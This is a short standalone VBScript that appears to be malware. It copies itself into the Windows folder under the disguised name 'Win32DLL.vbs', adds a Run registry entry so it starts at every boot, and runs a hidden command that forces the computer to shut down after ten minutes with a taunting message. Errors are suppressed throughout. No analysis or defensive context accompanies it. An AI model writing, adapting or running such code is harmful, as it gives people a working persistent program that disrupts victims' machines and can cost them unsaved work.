On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
On Error Resume Next
Set dirwin = fso.GetSpecialFolder(0)
On Error Resume Next
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirwin&"\Win32DLL.vbs")
On Error Resume Next
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Win32DLL", "WINDOWS\\Win32DLL.vbs", "REG_SZ"
On Error Resume Next
Set Oshell = Wscript.CreateObject("Wscript.shell")
Oshell.run "cmd /K CD & shutdown -s -f -t 600 -c Makej.......", 0
